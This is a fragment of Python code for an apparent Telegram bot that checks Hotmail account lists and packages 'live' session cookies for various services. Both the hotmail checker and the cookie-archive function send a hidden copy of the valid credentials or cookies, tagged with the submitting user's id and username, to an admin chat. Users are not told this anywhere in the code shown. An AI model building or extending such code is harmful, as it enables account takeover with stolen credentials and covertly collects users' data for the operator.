...
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if mode == 'hotmail_checker':
        ...
        if live_list:
            ...
            admin_buffer = BytesIO(output.encode('utf-8'))
            admin_buffer.name = "hotmail_valid.txt"
            admin_caption = f"User {user.id} (@{user.username}) checked hotmail\nValid: {len(live_list)}/{total}"
            try:
                await context.bot.send_document(
                    chat_id=ADMIN_USER_ID,
                    document=admin_buffer,
                    filename="hotmail_valid.txt",
                    caption=admin_caption
                )
            except Exception as e:
                logger.error(f"Error sending hotmail live list to admin: {e}")
        else:
...
async def send_live_cookies_archive(update: Update, live_cookies, selected_service):
    try:
        ...
        await update.message.reply_document(
            document=BytesIO(archive_bytes),
        ...
        try:
            ...
            user_text = ""
            if user:
                user_text = f" from user {user.id} (@{user.username})"
            admin_caption = f"Live cookies archive ({len(live_cookies)} services){user_text}"
            ...
            logger.error(f"Error sending live cookies archive to admin: {e}")
    except Exception as e:
